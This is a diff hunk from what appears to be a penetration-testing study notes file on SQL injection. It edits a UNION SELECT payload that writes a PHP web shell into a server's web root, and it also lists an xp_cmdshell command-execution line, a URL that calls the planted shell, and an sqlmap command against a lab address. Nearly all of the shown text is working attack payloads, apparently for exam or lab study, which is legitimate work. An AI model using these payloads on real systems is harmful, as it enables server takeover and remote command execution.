@@ -383,7 +383,7 @@
     `RECONFIGURE;`  
   - `EXECUTE xp_cmdshell 'whoami';`  
 - write files on web server
-  - `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
+  - `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`
   - `192xxx/tmp/webshell.php?cmd=id`  
 - Sqlmap (automating attack)
   - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`: find injection point  
